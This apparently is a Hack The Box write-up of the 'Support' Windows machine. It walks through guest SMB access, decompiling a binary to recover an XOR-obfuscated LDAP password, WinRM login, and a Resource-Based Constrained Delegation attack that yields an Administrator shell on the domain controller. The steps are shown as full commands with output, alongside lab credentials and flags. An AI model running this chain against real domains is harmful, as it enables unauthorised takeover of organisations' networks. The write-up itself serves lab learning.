---
layout: post
title: "HTB - Support"
categories: [writeup]
---

# Machine Info
Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication. After connecting to the share, an executable file is discovered that is used to query the machine's LDAP server for available users. Through reverse engineering, network analysis or emulation, the password that the binary uses to bind the LDAP server is identified and can be used to make further LDAP queries. A user called `support` is identified in the users list, and the `info` field is found to contain his password, thus allowing for a WinRM connection to the machine. Once on the machine, domain information can be gathered through `SharpHound`, and `BloodHound` reveals that the `Shared Support Accounts` group that the `support` user is a member of, has `GenericAll` privileges on the Domain Controller. A Resource Based Constrained Delegation attack is performed, and a shell as `NT Authority\System` is received.

# Nmap Scan
### DC.support.htb
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-20 02:28:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-03-20T02:28:32
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: -6h55m47s
```
# Initital Enumeration
Enumerating for null authentication and guest access revealed that `guest` user has read permissions on an unusual shares named `support-tools`. 
```
~/HTB/Windows/Support $ nxc smb DC -u '' -p '' --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.181  445    DC               [+] support.htb\:
SMB         10.129.230.181  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED

~/HTB/Windows/Support $ nxc smb DC -u guest -p '' --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.181  445    DC               [+] support.htb\guest:
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions     Remark
SMB         10.129.230.181  445    DC               -----           -----------     ------
SMB         10.129.230.181  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.181  445    DC               C$                              Default share
SMB         10.129.230.181  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON                        Logon server share
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
SMB         10.129.230.181  445    DC               SYSVOL                          Logon server share
```
Accessing the `support-tools` share, I discovered `UserInfo.exe.zip`. This appears to be a custom domain utility, so I proceeded to download it for further analysis.
```
~/HTB/Windows/Support $ smbclient -U guest% //DC/support-tools
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 21 00:01:06 2022
  ..                                  D        0  Sat May 28 18:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 18:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 18:19:55 2022
  putty.exe                           A  1273576  Sat May 28 18:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 18:19:31 2022
  UserInfo.exe.zip                    A   277499  Thu Jul 21 00:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 18:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 18:19:43 2022

                4026367 blocks of size 4096. 959170 blocks available

smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (141.8 KiloBytes/sec) (average 141.8 KiloBytes/sec)
```
Unzipped `UserInfo.exe.zip` to `UserInfo` directory.
```
~/HTB/Windows/Support $ unzip UserInfo.exe.zip -d UserInfo
Archive:  UserInfo.exe.zip
  inflating: UserInfo/UserInfo.exe
  inflating: UserInfo/CommandLineParser.dll
  inflating: UserInfo/Microsoft.Bcl.AsyncInterfaces.dll
  inflating: UserInfo/Microsoft.Extensions.DependencyInjection.Abstractions.dll
  inflating: UserInfo/Microsoft.Extensions.DependencyInjection.dll
  inflating: UserInfo/Microsoft.Extensions.Logging.Abstractions.dll
  inflating: UserInfo/System.Buffers.dll
  inflating: UserInfo/System.Memory.dll
  inflating: UserInfo/System.Numerics.Vectors.dll
  inflating: UserInfo/System.Runtime.CompilerServices.Unsafe.dll
  inflating: UserInfo/System.Threading.Tasks.Extensions.dll
  inflating: UserInfo/UserInfo.exe.config
```
Decompiled `UserInfo.exe` using `dnSpy` to investigate its functionality. Analyzing the `UserInfo.Services.LdapQuery` class revealed that the application attempts to establish an `LDAP` connection to `support.htb` using the `support\ldap` account.
```
<SNIP>
		public LdapQuery()
		{
		        string password = Protected.getPassword();
		        this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
		        this.entry.AuthenticationType = AuthenticationTypes.Secure;
		        this.ds = new DirectorySearcher(this.entry);
		}
<SNIP>
```
Further inspection of the `Protected.getPassword()` method identified a custom decryption routine. The binary obfuscates the LDAP password by performing a double `XOR` operation on a `Base64`-encoded string using a hardcoded key (`armando`) and the constant value `223`.
```
        internal class Protected
        {
                // Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
                public static string getPassword()
                {
                        byte[] array = Convert.FromBase64String(Protected.enc_password);
                        byte[] array2 = array;
                        for (int i = 0; i < array.Length; i++)
                        {
                                array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
                        }
                        return Encoding.Default.GetString(array2);
                }

                // Token: 0x04000005 RID: 5
                private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

                // Token: 0x04000006 RID: 6
                private static byte[] key = Encoding.ASCII.GetBytes("armando");
        }
```
Replicated the logic on `CyberChef` (https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'UTF8','string':'armando'%7D,'Standard',false)XOR(%7B'option':'Decimal','string':'223'%7D,'Standard',false)&input=ME52MzJQVHdnWWp6ZzkvOGo1VGJtdlBkM2U3V2h0V1d5dVBzeU83Ni9ZK1UxOTNF&oeol=FF), and retrieved the cleartext password: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`.
Authenticated to `LDAP` server with recovered credentials. Using the `get-info-users` module in `NetExec`, discovered `support` user whose `info` field contained a cleartext password.
```
~/HTB/Windows/Support $ nxc ldap DC -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -M get-info-users
LDAP        10.129.230.181  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.230.181  389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
GET-INFO... 10.129.230.181  389    DC               [+] Found following users:
GET-INFO... 10.129.230.181  389    DC               User: support              Info: Ironside47pleasure40Watchful
```
# Initial Foothold
Established an interactive session via `Evil-WinRM`using the `support` account and retrieved the user flag.
```
~/HTB/Windows/Support $ evil-winrm -i DC -u support -p Ironside47pleasure40Watchful
*Evil-WinRM* PS C:\Users\support\Documents> cat ..\Desktop\user.txt
5cef8735b0e4ab38525a4bce4661252b
```
Enumerated `AD` permissions using `BloodyAD`, which revealed that `support` possesses `GenericAll (DACL: WRITE)` privileges over the `DC$`.
```
~/HTB/Windows/Support $ bloodyad -u support -p Ironside47pleasure40Watchful -d support.htb -H DC.support.htb get writable
<SNIP>
distinguishedName: CN=DC,OU=Domain Controllers,DC=support,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
<SNIP>
```
# Compromise support.htb
To escalate to `Administrator`, I opted for a `Resource-Based Constrained Delegation (RBCD)` attack.
First, created a new computer account named `exploit$` using `addcomputer.py`. Subsequently, configured the delegation by writing to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the `DC`.
```
~/HTB/Windows/Support $ addcomputer.py support.htb/support:Ironside47pleasure40Watchful -computer-name 'exploit$' -computer-pass Password123
[*] Successfully added machine account exploit$ with password Password123.

~/HTB/Windows/Support $ rbcd.py support.htb/support:Ironside47pleasure40Watchful -delegate-from 'exploit$' -delegate-to 'DC$' -action write
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] exploit$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     exploit$     (S-1-5-21-1677581083-3380853377-188903654-6101)
```
Requested a Service Ticket for the `Administrator` user via the `S4U2Proxy` extension. After exporting the ticket to the environment, leveraged `winrmexec` to obtain a shell on the `DC` and retrieve the root flag.
```
~/HTB/Windows/Support $ getST.py support.htb/'exploit$':Password123 -spn http/DC.support.htb -impersonate Administrator
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@http_DC.support.htb@SUPPORT.HTB.ccache

~/HTB/Windows/Support $ export KRB5CCNAME=Administrator@http_DC.support.htb@SUPPORT.HTB.ccache

~/HTB/Windows/Support $ winrmexec DC -k -no-pass -spn http/DC.support.htb
PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
aff63760b1487c37bc9ba32a7de74e70
```
